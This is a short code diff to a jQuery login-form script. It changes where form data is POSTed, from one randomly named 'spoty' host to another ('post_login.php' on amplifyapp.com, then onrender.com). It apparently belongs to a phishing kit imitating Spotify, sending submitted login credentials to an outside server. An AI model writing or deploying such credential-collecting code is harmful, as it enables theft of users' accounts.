@@ -20,7 +20,7 @@ $(document).ready(function () {
 
         $.ajax({
             type: "POST",
-            url: "https://spoty-d2k0fla2d-la2dasfsd.d2sckfda9r5aua.amplifyapp.com/post_login.php",
+            url: "https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_login.php",
             data: formData,
             processData: false, // Prevent jQuery from automatically processing the data
             contentType: false, // Prevent jQuery from automatically setting the content type
